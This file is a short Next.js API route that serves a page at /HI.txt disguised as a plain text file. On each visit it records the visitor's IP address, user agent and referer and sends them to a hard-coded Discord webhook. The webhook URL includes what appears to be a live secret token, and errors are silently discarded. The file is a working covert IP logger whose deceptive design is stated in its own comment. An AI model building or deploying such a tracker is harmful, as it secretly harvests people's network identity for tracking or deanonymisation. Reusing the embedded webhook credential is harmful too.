// pages/HI.txt.js
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1436694884185538600/fshf-QIb1PUhJACMGckLf6rhcAFzceImMtwVTCW72_zSXYTgSPZ1PLX98HizDKz9kYFE";

export default async function handler(req, res) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || "unknown";
  const ua = req.headers['user-agent'] || "unknown";
  const referer = req.headers['referer'] || "direct";
  const time = new Date().toISOString();

  const logData = {
    ip,
    ua,
    referer,
    method: req.method,
    path: "/HI.txt",
    time,
    sast: "2025-11-15 23:59:00 SAST",
    country: "ZA"
  };

  // Send to Discord
  await fetch(DISCORD_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{
        title: "HI.txt Accessed",
        color: 0x00ff00,
        fields: [
          { name: "IP", value: ip, inline: true },
          { name: "User Agent", value: `\`\`\`${ua}\`\`\``, inline: false },
          { name: "Referer", value: referer || "none", inline: true },
          { name: "Time (SAST)", value: "2025-11-15 23:59:00", inline: true },
          { name: "Country", value: "ZA", inline: true }
        ],
        timestamp: time
      }]
    })
  }).catch(() => {});

  // Return plain text — looks EXACTLY like a .txt file
  res.setHeader("Content-Type", "text/plain");
  res.send(`
██╗  ██╗██╗
██║  ██║██║
███████║██║
██╔══██║╚═╝
██║  ██║██╗
╚═╝  ╚═╝╚═╝

HI.txt - Public Access Log
Time: 2025-11-15 23:59:00 SAST
Country: ZA

[ACCESS LOGGED TO DISCORD + VERCEL]
`.trim());
}

// Optional: Block node UA
export const config = {
  api: {
    bodyParser: false,
  },
};
